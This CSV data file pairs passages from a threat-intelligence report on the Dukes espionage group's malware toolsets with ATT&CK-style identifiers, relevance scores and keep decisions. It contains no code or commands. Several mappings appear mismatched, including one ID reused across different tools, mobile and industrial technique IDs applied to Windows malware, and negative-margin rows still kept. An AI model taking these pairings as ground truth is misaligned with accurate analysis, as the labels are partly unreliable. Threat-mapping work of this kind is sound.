"query","candidate","type","p_relevant","p_irrelevant","adj_score","margin","keep","decision"
"2013: CosmicDuke's war on drugs In a surprising turn of events, in September 2013 a CosmicDuke campaign was observed targeting Russian speakers involved in the trade of illegal and controlled substances (image 5, above). A few of the CosmicDuke samples we discovered also included components that attempt to exploit either of the publicly known CVE-2010-0232 or CVE-2010- 4398 privilege escalation vulnerabilities. After that, CosmicDuke and the second malware operate entirely independently of each other, including separately contacting their C&C servers. Available: http://seclists.org/fulldisclosure/2010/Jan/341 Timo Hirvonen; F-Secure Labs; CosmicDuke: Cosmu with a Twist of MiniDuke; published 2 July 2014; Back then, CosmicDuke still lacked most of the credential-stealing functionality found in later samples. COSMICDUKE First known activity January 2010 Most recent known activity Summer 2015 Other names Tinybaron, BotgenStudios, NemesisGemina C&C communication methods HTTP (S), FTP, WebDav Known toolset components ??? Information stealer ??? Multiple loaders ??? Privilege escalation component ??? Multiple persistence components The CosmicDuke toolset is designed around a main information stealer component. Concurrently with the alterations to CosmicDuke, the Dukes were also hard at work modifying their trusted loader. CosmicDuke's information stealing functionality includes: Keylogging Taking screenshots Stealing clipboard contents Stealing user files with file extensions that match a predefined list Exporting the users cryptographic certificates including private keys Collecting user credentials, including passwords, for a variety of popular chat and email programs as well as from web browsers CosmicDuke may use HTTP, HTTPS, FTP or WebDav to exfiltrate the collected data to a hardcoded C&C server. CosmicDuke's moment of fame and the scramble that ensued Following the MiniDuke expose, CosmicDuke in turn got its moment of fame when F-Secure published a whitepaper about it on 2 nd July 2014 During the rest of 2014 and the spring of 2015, the Dukes continued making similar evasionfocused modifications to CosmicDuke, as well as experimenting with ways to obfuscate the loader. During this period of CosmicDuke testing and development, the Duke authors also started experimenting with the use of privilege escalation vulnerabilities. Further reading Timo Hirvonen; F-Secure Labs; CosmicDuke: Cosmu with a Twist of MiniDuke; published 2 July 2014; https://www.fsecure.com/ documents/996508/1030745/cosmicduke_ whitepaper.pdf GReAT; Securelist; Miniduke is back: Nemesis Gemina and the Botgen Studio; published 3 July 2014; https://securelist. com/blog/ incidents/64107/miniduke-is-back-nemesis- gemina-and-the-botgen-studio/ In addition to often embedding persistence or privilege escalation components, CosmicDuke has occasionally embedded PinchDuke, GeminiDuke, or MiniDuke components. It should be noted that until this point, even though CosmicDuke had been in active use for over 4 years, and had undergone minor modifications and updates during that time, even the most recent CosmicDuke samples would often embed persistence components that date back to 2012. Some hints about the history of the 'MiniDuke loader' were noted in the CosmicDuke whitepaper we published [5] in 2014, where we observed that the loader appeared to have been in use with CosmicDuke before it was used with MiniDuke. Specifically, the techniques CosmicDuke uses to extract user credentials from targeted software and to detect the presence of analysis tools appear to be based on the techniques used by PinchDuke. The emergence of CosmicDuke in the Caucasus The spring of 2010 saw continued PinchDuke campaigns against Turkey and Georgia, but also numerous campaigns against other members of the Commonwealth of Independent States such as Kazakhstan, Kyrgyzstan, Azerbaijan and Uzbekistan. They could have ceased all use of CosmicDuke (at least until they had developed a new loader) or retired it entirely, since they still had other toolsets available. We believe the purpose of this parallel use was to 'fieldtest' the new CosmicDuke tool, while at the same time ensuring operational success with the tried-and-tested PinchDuke. We however feel it is unlikely that the CosmicDuke operators targeting drug dealers and those targeting governments could be two entirely independent entities. While we believe CosmicDuke to be an entirely custom- written toolset with no direct sharing of code with other Duke toolsets, the high-level ways in which many of its features have been implemented appear to be shared with other members of the Duke arsenal.","S0234","S","0.967147","0.032853","0.967147","0.934294","True","keep"
"Additionally, the apparent timezone of the timestamps in all of the GeminiDuke samples compiled during the winter is UTC+3, while for samples compiled during the summer, it is UTC+4. As is common for malware, the GeminiDuke infostealer uses a mutex to ensure that only one instance of itself is running at a time. GEMINIDUKE First known activity January 2009 Most recent known activity December 2012 Other names However, GeminiDuke samples compiled after MSK was altered still vary the timezone between UTC+3 in the winter and UTC+4 during the summer. N/A C&C communication methods HTTP (S) Known toolset components ??? Loader ??? Information stealer ??? Multiple persistence components The GeminiDuke toolset consists of a core information stealer, a loader and multiple persistencerelated components. The GeminiDuke infostealer has occasionally been wrapped with a loader that appears to be unique to GeminiDuke and has never been observed being used with any of the other Duke toolsets. This assertion of time zone is also supported by timestamps found in many GeminiDuke samples, which similarly suggest the group work in the Moscow Standard Time timezone, as further detailed in the section on the technical analysis of GeminiDuke (page 23). Unlike CosmicDuke and PinchDuke, GeminiDuke primarily collects information on the victim computer's configuration. Unlike HammerDuke however, the URLs for the images downloaded by GeminiDuke are hardcoded in its initial configuration, rather than retrieved from Twitter.","S0025","S","0.951944","0.048056","0.951944","0.903888","True","keep"
"Additionally, Kaspersky noted that based on the compilation timestamps, the authors of the Duke malware appear to primarily work from Monday to Friday between the times of 6am and 4pm UTC+0","S0050","S","0.852424","0.147576","0.852424","0.704848","True","keep"
"ATTRIBUTION AND STATE-SPONSORSHIP Attribution is always a difficult question, but attempting to answer it is important in understanding these types of threats and how to defend against them.","TA0030","T","0.894333","0.105667","0.894333","0.788666","True","keep"
"We are however only aware of one instance - the exploitation of CVE-2013-0640 to deploy MiniDuke - where we believe the exploited vulnerability was a zero-day at the time that the group acquired the exploit.","S0337","S","0.781077","0.218923","0.781077","0.562154","True","keep"
"Finally, it is worth noting that the Dukes are known to sometimes re-infect a victim of one of their malware tools with another one of their tools.","S0048","S","0.955636","0.044364","0.955636","0.911272","True","keep"
"The only instances which we are aware of where the Dukes did not use spear-phishing as the initial infection vector is with certain OnionDuke variants.","T0865","T","0.746787","0.253213","0.746787","0.493574","True","keep"
"The spear-phishing emails used by the Dukes may contain either specially-crafted malicious attachments or links to URLs hosting the malware.","T0865","T","0.721296","0.278704","0.721296","0.442592","True","keep"
"These spear-phishing emails range from ones purposely designed to look like spam messages used to spread common crimeware and addressed to large numbers of people, to highly targeted emails addressed to only a few recipients (or even just one person) and with content that is highly relevant for the intended recipient(s).","T0865","T","0.865515","0.134485","0.865515","0.73103","True","keep"
"INFECTION VECTORS The Dukes primarily use spear-phishing emails when attempting to infect victims with their malware. In some cases, the Dukes appear to have used previously compromised victims to send new spear-phishing emails to other targets. The group did change the contents of the spear-phishing emails they sent, but they didn't switch to a new email format; instead, they reverted to the same efaxthemed format that they had previously employed, even to the point of reusing the exact same decoy document that they had used in the CozyDuke campaign a year earlier (July 2014). The spear-phishing emails used by the Dukes may contain either specially-crafted malicious attachments or links to URLs hosting the malware. These spear-phishing emails range from ones purposely designed to look like spam messages used to spread common crimeware and addressed to large numbers of people, to highly targeted emails addressed to only a few recipients (or even just one person) and with content that is highly relevant for the intended recipient(s).","T0865","T","0.935755","0.064245","0.935755","0.87151","True","keep"
"While one variant will use a preconfigured C&C server over HTTP or HTTPS, the other variant will use a Microsoft OneDrive account to exchange commands and stolen data with its operators.","TA0101","T","0.978738","0.021262","0.978738","0.957476","True","keep"
"The CloudDuke downloader will download and execute additional malware from a preconfigured location.","T1430.001","T","0.903084","0.096916","0.903084","0.806168","True","keep"
"CLOUDDUKE First known activity June 2015 Most recent known activity Summer 2015 Other names MiniDionis, CloudLook C&C communication methods HTTP (S), Microsoft OneDrive Known toolset components ??? Downloader ??? Loader ??? Two backdoor variants CloudDuke is a malware toolset known to consist of, at least, a downloader, a loader and two backdoor variants. The CloudDuke downloader will download and execute additional malware from a preconfigured location. The malware toolset used for this campaign was the previously unseen CloudDuke and we believe that the July campaign marks the first time that this toolset was deployed by the Dukes, other than possible small-scale testing.","S0334","S","0.868031","0.131969","0.868031","0.736062","True","keep"
"Further reading FireEye; HAMMERTOSS: Stealthy Tactics Define a Russian Cyber Threat Group; published July 2015; https://www2.fireeye.com/rs/848-DID-242/ images/rpt-apt29-hammertoss.pdf * *APT29 is the name used by FireEye to identify the cyberespionagegroup we refer to as the Dukes.","S0674","S","0.825306","0.174694","0.825306","0.650612","True","keep"
"In contrast however, for OnionDuke and MiniDuke the linked image files contain embedded malware to be downloaded and executed, rather than instructions.","T1027.009","T","0.897749","0.102251","0.897749","0.795498","True","keep"
"This, together with HammerDuke's simplistic backdoor functionality, suggests that it is primarily used by the Dukes group as a secondary backdoor left on CozyDuke victims after CozyDuke performed the initial infection and stole any readily available information from them.","S0568","S","0.96578","0.03422","0.96578","0.93156","True","keep"
"HAMMERDUKE First known activity January 2015 Most recent known activity Summer 2015 Other names HAMMERTOSS, Netduke C&C communication methods HTTP (S), Twitter Known toolset components ??? Backdoor HammerDuke is a simple backdoor that is apparently designed for similar use cases as SeaDuke. HammerDuke SeaDuke OnionDuke CozyDuke CosmicDuke GeminiDuke PinchDuke MiniDuke ItaDuke Duqu 'duke' 'duke' The Dukes HammerDuke is however interesting because it is written in .NET, and even more so because of its occasional use of Twitter as a C&C communication channel. HammerDuke's use of Twitter and crafted image files is reminiscent of other Duke toolsets. If the account exists, HammerDuke will then search for tweets from that account with links to image files that contain embedded commands for the toolset to execute. Some HammerDuke variants only contain a hardcoded C&C server address from which they will retrieve commands, but other HammerDuke variants will first use a custom algorithm to generate a Twitter account name based on the current date. Specifically, the only known infection vector for HammerDuke is to be downloaded and executed by CozyDuke onto a victim that has already been compromised by that toolset. This, together with HammerDuke's simplistic backdoor functionality, suggests that it is primarily used by the Dukes group as a secondary backdoor left on CozyDuke victims after CozyDuke performed the initial infection and stole any readily available information from them.","T1566.001","T","0.941683","0.058317","0.941683","0.883366","True","keep"
"HAMMERDUKE First known activity January 2015 Most recent known activity Summer 2015 Other names HAMMERTOSS, Netduke C&C communication methods HTTP (S), Twitter Known toolset components ??? Backdoor HammerDuke is a simple backdoor that is apparently designed for similar use cases as SeaDuke.","S0130","S","0.948801","0.051199","0.948801","0.897602","True","keep"
"Available: http://www.boost.org/users/ history/ version_1_54_0.html Artturi Lehtio; F-Secure Weblog; OnionDuke: APT Attacks Via the Tor Network; published 14 November 2014; com/2015/07/unit-42-technical-analysis- seaduke/ Artturi Lehtio; F-Secure Weblog; Duke APT group's latest tools: cloud services and Linux support; published 22 July 2015; https://www.f- secure.com/weblog/archives/00002822.html","S0237","S","0.896992","0.103008","0.896992","0.793984","True","keep"
"Further reading Artturi Lehtio; F-Secure Weblog; Duke APT group's latest tools: cloud services and Linux support; published 22 July 2015; https://www.f-secure. com/2015/07/unit-42-technical-analysis- seaduke/ Artturi Lehtio; F-Secure Weblog; Duke APT group's latest tools: cloud services and Linux support; published 22 July 2015; https://www.f- secure.com/weblog/archives/00002822.html","S0665","S","0.868907","0.131093","0.868907","0.737814","True","keep"
"Like HammerDuke, SeaDuke appears to be used by the Dukes group primarily as a secondary backdoor left on CozyDuke victims after that toolset has completed the initial infection and stolen any readily available information from them.","S0649","S","0.953758","0.046242","0.953758","0.907516","True","keep"
"Like HammerDuke, SeaDuke appears to be used by the Dukes group primarily as a secondary backdoor left on CozyDuke victims after that toolset has completed the initial infection and stolen any readily available information from them. SEADUKE First known activity October 2014 Most recent known activity Spring 2015 Other names SeaDaddy, SeaDask C&C communication methods HTTP (S) Known toolset components ??? Backdoor SeaDuke is a simple backdoor that focuses on executing commands retrieved from its C&C server, such as uploading and downloading files, executing system commands and evaluating additional Python code.","S0142","S","0.961874","0.038126","0.961874","0.923748","True","keep"
"SEADUKE First known activity October 2014 Most recent known activity Spring 2015 Other names SeaDaddy, SeaDask C&C communication methods HTTP (S) Known toolset components ??? Backdoor SeaDuke is a simple backdoor that focuses on executing commands retrieved from its C&C server, such as uploading and downloading files, executing system commands and evaluating additional Python code.","S0130","S","0.96783","0.03217","0.96783","0.93566","True","keep"
"Further reading Artturi Lehtio; F-Secure Weblog; OnionDuke: APT Attacks Via the Tor Network; published 14 November 2014; https:// www.f-secure.com/ weblog/archives/00002764.html","S0175","S","0.907808","0.092192","0.907808","0.815616","True","keep"
"Based on our investigations into OnionDuke, we believe that for about 7 months, from April 2014 to when Leviathan published their blog post in October 2014, the Tor exit node identified by the researchers was being used to wrap executables on-the-fly with OnionDuke (image 7, page 13). Both OnionDuke and MiniDuke also use date-based algorithms to generate Twitter account names and then searched for any tweets from those accounts that linked to image files. For most of the OnionDuke components we observed, the first versions that we are aware of were compiled during the summer of 2013, suggesting that this was a period of active development around this toolset. Further reading Artturi Lehtio; F-Secure Weblog; OnionDuke: APT Attacks Via the Tor Network; published 14 November 2014; https:// www.f-secure.com/ weblog/archives/00002764.html Further, the functionality of the OnionDuke variant is derived from a number of modules. In contrast however, for OnionDuke and MiniDuke the linked image files contain embedded malware to be downloaded and executed, rather than instructions. In fact, we saw yet another Duke malware toolset, OnionDuke, appear first in 2013. Like CozyDuke, OnionDuke appears to have been designed with versatility in mind, and takes a similarly modular platform approach. ONIONDUKE First known activity February 2013 Most recent known activity Spring 2015 Other names N/A C&C communication methods HTTP (S), Twitter (backup) On the 14 th of November, F-Secure published a blog post naming the malware OnionDuke and associating it with MiniDuke and CosmicDuke, the other Duke toolsets known at the time OnionDuke first caught our attention because it was being spread via a malicious Tor exit node. OnionDuke gets caught using a malicious Tor node On the 23 rd of October 2014, Leviathan Security Group published a blog post describing a malicious Tor exit node they had found. OnionDuke's development therefore could not have been simply a response to the outing of one of the other Duke malware, but was instead intended for use alongside the other toolsets. Screenshot of a tweet intended for OnionDuke, with a link pointing to an image file that embeds an updated version of OnionDuke. The counter to that argument however is that the value of stolen credentials from users in the countries with the highest percentage of OnionDuke bots (Mongolia and India) are among the lowest on underground markets. The use of Twitter either to initially obtain the address of a C&C server (or as a backup if no hardcoded primary C&C server responds) is a feature also found in OnionDuke, CozyDuke, and HammerDuke. We have since been able to identify at least two separate OnionDuke botnets. What makes OnionDuke especially curious is an infection vector it began using during the summer of 2013.","S0226","S","0.951922","0.048078","0.951922","0.903844","True","keep"
"Again, if a victim downloaded a torrent containing a wrapped executable, they would get infected with OnionDuke.","T1137.003","T","0.870397","0.129603","0.870397","0.740794","True","keep"
"Based on our investigations into OnionDuke, we believe that for about 7 months, from April 2014 to when Leviathan published their blog post in October 2014, the Tor exit node identified by the researchers was being used to wrap executables on-the-fly with OnionDuke (image 7, page 13). OnionDuke first caught our attention because it was being spread via a malicious Tor exit node.","S0175","S","0.95222","0.04778","0.95222","0.90444","True","keep"
"com/documents/996508/ 1030745/CozyDuke Kurt Baumgartner, Costin Raiu; Securelist; The CozyDuke APT; 21 April 2015; https://securelist. com/blog/ research/69731/the-cozyduke-apt/","S0046","S","0.361073","0.638927","0.361073","-0.277854","True","keep"
"Available: https://www.f-secure.com/ documents/996508/ 1030745/CozyDuke Symantec Security Response; 'Forkmeiamfamous': Seaduke, latest weapon in the Duke armory; published 13 July 2015; [Online]. Based on these and other similar stylistic differences observed between CozyDuke and its older siblings, we speculate that while the older Duke families appear to be the work of someone with a background in malware writing (or at the least in hacking), CozyDuke's author or authors more likely came from a software development background. Based on this, we do not believe that the Dukes are replacing their covert and targeted campaigns with the overt and opportunistic CozyDuke and CloudDuke style of campaigns. CozyDuke and monkey videos While we now know that CozyDuke had been under development since at least the end of 2011, it was not until the early days of July 2014 that the first large-scale CozyDuke campaign that we are aware of took place. CozyDuke's modular platform approach is a clear break from the designs of the previous Duke toolsets. Even if the noisy initial CozyDuke campaign is noticed by the victim organization, or by someone else who then makes it publicly known, defenders will begin by first looking for indicators of compromise (IOCs) related to the CozyDuke toolset. Finally, early CozyDuke versions also featured other elements that one would associate more with a traditional software development project than with malware. In other cases, CozyDuke has been observed downloading and executing tools from other toolsets used by the Dukes such as OnionDuke, SeaDuke, and HammerDuke. Known CozyDuke modules include: Command execution module for executing arbitrary Windows Command Prompt commands Password stealer module NT LAN Manager (NTLM) hash stealer module System information gathering module Screenshot module In addition to modules, CozyDuke can also be instructed to download and execute other, independent executables. Like CozyDuke, OnionDuke appears to have been designed with versatility in mind, and takes a similarly modular platform approach. Some of the CozyDuke spear-phishing emails from early July posed as e-fax arrival notifications, a popular theme for spam emails, and used the same 'US letter fax test page' decoy document that was used a year later by CloudDuke. Their 2015 CozyDuke and CloudDuke campaigns take this to the extreme by apparently opting for speed and quantity over stealth and quality. These modules are used to selectively provide CozyDuke with just the functionality deemed necessary for the mission at hand. com/documents/996508/ 1030745/CozyDuke Kurt Baumgartner, Costin Raiu; Securelist; The CozyDuke APT; 21 April 2015; https://securelist. com/blog/ research/69731/the-cozyduke-apt/","S0665","S","0.940518","0.059482","0.940518","0.881036","True","keep"
"Known CozyDuke modules include: Command execution module for executing arbitrary Windows Command Prompt commands Password stealer module NT LAN Manager (NTLM) hash stealer module System information gathering module Screenshot module In addition to modules, CozyDuke can also be instructed to download and execute other, independent executables.","T0807","T","0.969358","0.030642","0.969358","0.938716","True","keep"
"These modules are used to selectively provide CozyDuke with just the functionality deemed necessary for the mission at hand. This component can be instructed by the C&C server to download and execute arbitrary modules, and it is these modules that provide CozyDuke with its vast array of functionality. This information stealer is augmented by a variety of components that the toolset operators may selectively include with the main component to provide additional functionalities, such as multiple methods of establishing persistence, as well as modules that attempt to exploit privilege escalation vulnerabilities in order to execute CosmicDuke with higher privileges.","S0177","S","0.984686","0.015314","0.984686","0.969372","True","keep"
"com/wp-content/uploads/downloads/2013/04/ MiniDuke_Paper_Final.pdf CIRCL - Computer Incident Response Center Luxembourg; Analysis Report (TLP:WHITE) Analysis of a stage 3 Miniduke sample; published 30 May 2013; https://www.circl.lu/files/tr-14/ circl-analysisreport-miniduke-stage3-public.pdf ESET WeLiveSecurity blog; Miniduke still duking it out; published 20 May 2014; http://www. welivesecurity.","S0234","S","0.688725","0.311275","0.688725","0.37745","True","keep"
"Available: https://www.fireeye.com/blog/threat-research/2013/02/in-turn-its-pdf- time.html Costin Raiu, Igor Soumenkov, Kurt Baumgartner, Vitaly Kamluk; Kaspersky Lab; The MiniDuke Mystery: PDF 0-day Government Spy Assembler 0x29A Micro Backdoor; published 27 February 2013; Further reading Costin Raiu, Igor Soumenkov, Kurt Baumgartner, Vitaly Kamluk; Kaspersky Lab; The MiniDuke Mystery: PDF 0-day Government Spy Assembler 0x29A Micro Backdoor; published 27 February 2013; http://kasperskycontenthub.com/ wp-content/ uploads/sites/43/vlpdfs/themysteryofthepdf0-dayassemblermicrobackdoor.pdf CrySyS Blog; Miniduke; published 27 February 2013; http://blog.crysys.hu/2013/02/miniduke/ Marius Tivadar, B??r?? Bal??zs, Cristian Istrate; BitDefender; A Closer Look at MiniDuke; published April 2013; http://labs. bitdefender.","S0354","S","0.546019","0.453981","0.546019","0.092038","True","keep"
"All of the 4 previously mentioned toolsets were written in a minimalistic style commonly seen with malware; MiniDuke even goes as far as having many components written in Assembly language. As researchers continued discovering new toolsets that were created and used by the same group that had been operating MiniDuke, the new toolsets were also given 'Duke'-derived names, and thus the threat actor operating the toolsets started to be commonly referred to as 'the Dukes'. As we now know, by February 2013 the Dukes group had been operating MiniDuke and other toolsets for at least 4 and a half years. Available: http://blog.trendmicro.com/trendlabs-security- intelligence/pawnstorms-domestic-spying-campaign-revealed-ukraine-and-us-top-global-targets/ GReAT; Securelist; Miniduke is back: Nemesis Gemina and the Botgen Studio; published 3 July 2014; CosmicDuke's moment of fame and the scramble that ensued Following the MiniDuke expose, CosmicDuke in turn got its moment of fame when F-Secure published a whitepaper about it on 2 nd July 2014 MINIDUKE First known activity ??? Loader July 2010 ??? Backdoor May 2011 Most recent known activity ??? Loader: Spring 2015 ??? Backdoor: Summer 2014 Other names N/A C&C communication methods HTTP (S), Twitter Known toolset components ??? Downloader ??? Backdoor ??? Loader The MiniDuke toolset consists of multiple downloader and backdoor components, which are commonly referred to as the MiniDuke 'stage 1', 'stage 2', and 'stage 3' components as per Kaspersky's original MiniDuke whitepaper. MiniDuke's rise from the ashes While MiniDuke activity decreased significantly during the rest of 2013 following the attention it garnered from researchers, the beginning of 2014 saw the toolset back in full force. Much like the MiniDuke expose in February 2013, the Dukes again appeared to prioritize continuing operations over staying hidden. Of these, the crucial one is the presence of PDB strings in the MiniDuke exploits. On the 14 th of November, F-Secure published a blog post naming the malware OnionDuke and associating it with MiniDuke and CosmicDuke, the other Duke toolsets known at the time Secondly, some of the MiniDuke components do not contain a hardcoded C&C server address, but instead obtain the address of a current C&C server via Twitter. The Dukes continued the expansion of their arsenal in 2011 with the addition of two more toolsets: MiniDuke and CozyDuke. The first observed samples of the MiniDuke backdoor component are from May 2011. This method is not unique to HammerDuke, as MiniDuke, OnionDuke, and CozyDuke all support similar use of Twitter (image 9, page 18) to retrieve links to additional payloads or commands. We are however only aware of one instance - the exploitation of CVE-2013-0640 to deploy MiniDuke - where we believe the exploited vulnerability was a zero-day at the time that the group acquired the exploit. While the loader has often been used together with other MiniDuke components, it has also commonly been used in conjunction with CosmicDuke and PinchDuke.","S0177","S","0.928862","0.071138","0.928862","0.857724","True","keep"
"MINIDUKE First known activity ??? Loader July 2010 ??? Backdoor May 2011 Most recent known activity ??? Loader: Spring 2015 ??? Backdoor: Summer 2014 Other names N/A C&C communication methods HTTP (S), Twitter Known toolset components ??? Downloader ??? Backdoor ??? Loader The MiniDuke toolset consists of multiple downloader and backdoor components, which are commonly referred to as the MiniDuke 'stage 1', 'stage 2', and 'stage 3' components as per Kaspersky's original MiniDuke whitepaper. ONIONDUKE First known activity February 2013 Most recent known activity Spring 2015 Other names N/A C&C communication methods HTTP (S), Twitter (backup)","S0130","S","0.925688","0.074312","0.925688","0.851376","True","keep"
"Available: http://seclists.org/fulldisclosure/2010/Jan/341 Timo Hirvonen; F-Secure Labs; CosmicDuke: Cosmu with a Twist of MiniDuke; published 2 July 2014; Further reading Timo Hirvonen; F-Secure Labs; CosmicDuke: Cosmu with a Twist of MiniDuke; published 2 July 2014; https://www.fsecure.com/ documents/996508/1030745/cosmicduke_ whitepaper.pdf GReAT; Securelist; Miniduke is back: Nemesis Gemina and the Botgen Studio; published 3 July 2014; https://securelist. com/blog/ incidents/64107/miniduke-is-back-nemesis- gemina-and-the-botgen-studio/","S0356","S","0.372325","0.627675","0.372325","-0.25535","True","keep"
"However, many of these loader samples embed CosmicDuke variants that exploit the CVE-2010- 0232 privilege escalation vulnerability thus making it impossible for the compilation timestamps to be authentic.","S1168","S","0.921126","0.078874","0.921126","0.842252","True","keep"
"After that, CosmicDuke and the second malware operate entirely independently of each other, including separately contacting their C&C servers.","S0050","S","0.573512","0.426488","0.573512","0.147024","True","keep"
"A few of the CosmicDuke samples we discovered also included components that attempt to exploit either of the publicly known CVE-2010-0232 or CVE-2010- 4398 privilege escalation vulnerabilities. In the case of CVE-2010-0232, the exploit appears to be based directly on the proof of concept code published by security researcher Tavis Ormandy when he disclosed the vulnerability [4] .","S1073","S","0.846698","0.153302","0.846698","0.693396","True","keep"
"Likewise, many of CosmicDuke's persistence components use techniques also used by components associated with GeminiDuke and CozyDuke. Specifically, the techniques CosmicDuke uses to extract user credentials from targeted software and to detect the presence of analysis tools appear to be based on the techniques used by PinchDuke.","T1630.003","T","0.955502","0.044498","0.955502","0.911004","True","keep"
"While we believe CosmicDuke to be an entirely custom- written toolset with no direct sharing of code with other Duke toolsets, the high-level ways in which many of its features have been implemented appear to be shared with other members of the Duke arsenal.","S0018","S","0.964097","0.035903","0.964097","0.928194","True","keep"
"CosmicDuke's information stealing functionality includes: Keylogging Taking screenshots Stealing clipboard contents Stealing user files with file extensions that match a predefined list Exporting the users cryptographic certificates including private keys Collecting user credentials, including passwords, for a variety of popular chat and email programs as well as from web browsers CosmicDuke may use HTTP, HTTPS, FTP or WebDav to exfiltrate the collected data to a hardcoded C&C server.","S1116","S","0.978141","0.021859","0.978141","0.956282","True","keep"
"COSMICDUKE First known activity January 2010 Most recent known activity Summer 2015 Other names Tinybaron, BotgenStudios, NemesisGemina C&C communication methods HTTP (S), FTP, WebDav Known toolset components ??? Information stealer ??? Multiple loaders ??? Privilege escalation component ??? Multiple persistence components The CosmicDuke toolset is designed around a main information stealer component.","S0447","S","0.940432","0.059568","0.940432","0.880864","True","keep"
"Some of the observed GeminiDuke samples that used timestamps as mutex names were compiled while MSK still respected DST and for these samples, the timestamps perfectly align with MSK as it was defined at the time.","S0023","S","0.915089","0.084911","0.915089","0.830178","True","keep"
"The collected details include: Local user accounts Network settings Internet proxy settings Installed drivers Running processes Programs previously executed by users Programs and services configured to automatically run at startup Values of environment variables Files and folders present in any users home folder Files and folders present in any users My Documents Programs installed to the Program Files folder Recently accessed files, folders and programs","T1087.001","T","0.975897","0.024103","0.975897","0.951794","True","keep"
"N/A C&C communication methods HTTP (S) Known toolset components ??? Loader ??? Information stealer ??? Multiple persistence components The GeminiDuke toolset consists of a core information stealer, a loader and multiple persistencerelated components.","T1213.001","T","0.824031","0.175969","0.824031","0.648062","True","keep"
"Based on our technical analysis of the known PinchDuke samples from 2008 however, we believe PinchDuke to have been under development by the summer of 2008. Credentials targeted by PinchDuke include ones associated with the following software or services: The Bat! Importantly, PinchDuke trojan samples always contain a notable text string, which we believe is used as a campaign identifier by the Dukes group to distinguish between multiple attack campaigns that are run in parallel. In addition to often embedding persistence or privilege escalation components, CosmicDuke has occasionally embedded PinchDuke, GeminiDuke, or MiniDuke components. In fact, in 2009 a PinchDuke sample had been included in the malware set used by the AV-Test security product testing organization to perform anti-virus product comparison reviews. In fact, the oldest samples of the loader that we have found were used with PinchDuke. In fact, we now know that before being used with either, the 'MiniDuke loader' was used to load PinchDuke. PinchDuke will also search for files that have been created within a predefined timeframe and whose file extension is present in a predefined list. Right - Decoy document from a 2009 PinchDuke campaign targeting Poland, the Czech Republic and a US think tank. The PinchDuke information stealer gathers system configuration information, steals user credentials, and collects user files from the compromised host transferring these via HTTP(S) to a C&C server. The story of the Dukes, as it is currently known, begins with a malware toolset that we call PinchDuke. This belief is based on the observation that in all of the other PinchDuke samples we have analyzed, the date of the campaign identifier has been within a day of the compilation date. We believe PinchDuke's credential stealing functionality is based on the source code of the Pinch credential stealing malware (also known as LdPinch) that was developed in the early 2000s and has later been openly distributed on underground forums. We believe that during the spring of 2010, the credential and file stealing capabilities of PinchDuke were slowly ported to CosmicDuke, effectively making PinchDuke obsolete. We believe the purpose of this parallel use was to 'fieldtest' the new CosmicDuke tool, while at the same time ensuring operational success with the tried-and-tested PinchDuke.","T1056","T","0.945527","0.054473","0.945527","0.891054","True","keep"
"Credentials targeted by PinchDuke include ones associated with the following software or services: The Bat!","T1552.001","T","0.809501","0.190499","0.809501","0.619002","True","keep"
"We believe PinchDuke's credential stealing functionality is based on the source code of the Pinch credential stealing malware (also known as LdPinch) that was developed in the early 2000s and has later been openly distributed on underground forums.","S0007","S","0.97932","0.02068","0.97932","0.95864","True","keep"
"In the most extreme case, the Dukes continued with their July 2015 CloudDuke campaign even after their activity had been outed by multiple security vendors. What is most significant about the July 2015 CloudDuke campaign is the timeline.","S1042","S","0.87568","0.12432","0.87568","0.75136","True","keep"
"Sometimes, both malware have used the same C&C server, but in other cases, even the servers have been different. While the BastionSolution variant simply retrieves commands from a hard-coded C&C server controlled by the Dukes, the OneDriveSolution utilizes Microsoft's OneDrive cloud storage service for communicating with its masters, making it significantly harder for defenders to notice the traffic and block the communication channel.","TA0101","T","0.977189","0.022811","0.977189","0.954378","True","keep"
"The malware toolset used for this campaign was the previously unseen CloudDuke and we believe that the July campaign marks the first time that this toolset was deployed by the Dukes, other than possible small-scale testing.","S0130","S","0.950892","0.049108","0.950892","0.901784","True","keep"
"In this way, the advanced HammerDuke variant attempts to hide its network traffic in more legitimate use of Twitter.","T1481.001","T","0.964319","0.035681","0.964319","0.928638","True","keep"
"The simpler one will connect to a hardcoded C&C server over HTTP or HTTPS to download commands to execute.","TA0101","T","0.974853","0.025147","0.974853","0.949706","True","keep"
"We believe the primary purpose of this tactic is an attempt at evading detection in the targeted network.","T1590.004","T","0.868991","0.131009","0.868991","0.737982","True","keep"
